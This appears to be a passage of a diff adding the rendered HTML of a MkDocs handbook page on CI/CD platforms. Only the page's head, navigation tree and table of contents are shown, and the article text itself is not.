@@ -1,0 +1,3163 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A handbook about Software Engineering, Data and AI">
+      
+      
+        <meta name="author" content="locch">
+      
+      
+        <link rel="canonical" href="https://locchh.github.io/sw-handbook/software/tool_tip/cicd/">
+      
+      
+        <link rel="prev" href="../server_operations/">
+      
+      
+        <link rel="next" href="../linux_commands/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>CI/CD Platforms - Software Handbook</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cicd-platforms" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Software Handbook" class="md-header__button md-logo" aria-label="Software Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Software Handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              CI/CD Platforms
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/locchh/sw-handbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    locchh/sw-handbook
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Software Handbook" class="md-nav__button md-logo" aria-label="Software Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Software Handbook
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/locchh/sw-handbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    locchh/sw-handbook
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Software
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Software
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Fundamentals
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/algorithms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Structures & Algorithms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/principles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Design Principles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/methodologies/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Philosophies & Methodologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/concurrency/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concurrency
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/error_handling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Error Handling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/apis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    APIs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/lifecycle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lifecycle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/git/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Git: Merge vs Rebase
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/code_review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Code Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/tech_stacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tech Stacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/styles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Styles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/becoming_senior/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Becoming Senior
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/senior_curriculum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Senior Curriculum
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/abbreviations/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abbreviations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/study_guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Study Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/posts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Posts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Advanced
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Advanced
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../advanced/books/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture Books
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tool/Tip
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tool/Tip
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tips
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../machine_setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machine Setup
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../server_operations/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Running a Server
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD Platforms
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD Platforms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0-cicd-is-three-things" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        0. "CI/CD" Is Three Things
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-what-makes-a-repo-have-cicd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. What Makes a Repo "Have CI/CD"
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-how-the-platform-reaches-your-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. How the Platform Reaches Your Code
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-minimum-working-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Minimum Working Config
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-environment-variables-and-secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Environment Variables and Secrets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-resource-control-cpu-ram-disk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Resource Control: CPU, RAM, Disk
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Resource Control: CPU, RAM, Disk">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#github-actions-fixed-tiers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GitHub Actions — fixed tiers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gitlab-you-configure-the-runner" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GitLab — you configure the runner
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jenkins-executors-and-agents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jenkins — executors and agents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vercel-pick-a-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vercel — pick a machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disk-and-inodes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Disk and inodes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-how-the-deploy-actually-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. How the Deploy Actually Happens
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Best Practices
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux_commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tmux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    tmux Cheatsheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../data/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Data
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Fundamentals
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/introduction_to_data/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction to Data
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/data_modeling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Modelling & Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/databases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Databases
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/data_engineering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Engineering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/data_quality/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Quality & Cleansing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/data_governance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Governance & Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/data_security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Classification & Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/analytics/" class="md-nav__link">
+        
